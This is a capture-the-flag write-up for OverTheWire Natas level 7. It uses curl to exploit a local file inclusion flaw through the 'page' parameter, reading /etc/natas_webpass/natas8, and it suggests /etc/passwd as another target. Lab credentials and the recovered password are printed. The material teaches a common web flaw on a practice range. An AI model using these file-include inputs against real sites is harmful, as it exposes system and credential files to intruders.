# Natas Level 6 -> 7 

## 🧠 Goal

Find password to the next level

---

## 🔐 Credentials

- **Username:** `natas7`  
- **Host:** `natas7.natas.labs.overthewire.org`   
- **Port:** `80` (HTTP)  
- **Password:** `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS` 

---

## 🖥️ Commands Used

```bash
┌──(amro㉿amro)-[~]
└─$ curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS natas7.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>

┌──(amro㉿amro)-[~]
└─$ curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS \
> natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8 \
> |html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   295  100   295    0     0   1316      0 --:--:-- --:--:-- --:--:--  1322
****** Not Found ******
The requested URL was not found on this server.
===============================================================================
     Apache/2.4.58 (Ubuntu) Server at natas7.natas.labs.overthewire.org
     Port 80
                                                                                                     
┌┌──(amro㉿amro)-[~]
└─$ curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS \
natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 \
> |html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1015  100  1015    0     0   4473      0 --:--:-- --:--:-- --:--:--  4471
****** natas7 ******
Home About

xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
___

## 💡 Tips
```bash
curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS \
natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

After looking at the source code I found that the web links reference a page file which is passed directely into index.php. What does that really mean? What happens if I try to pass the webserver something other than that? This may be a “file include” vulnerability which deals with the fact that some code developers are lazy. For example: What if the line of code which fetches the webpage is something like this: include($_GET['page']); This results in the php script attempting to fetch whatever lies in ‘page’

For example: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd
___

## 📤 Output
```bash
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
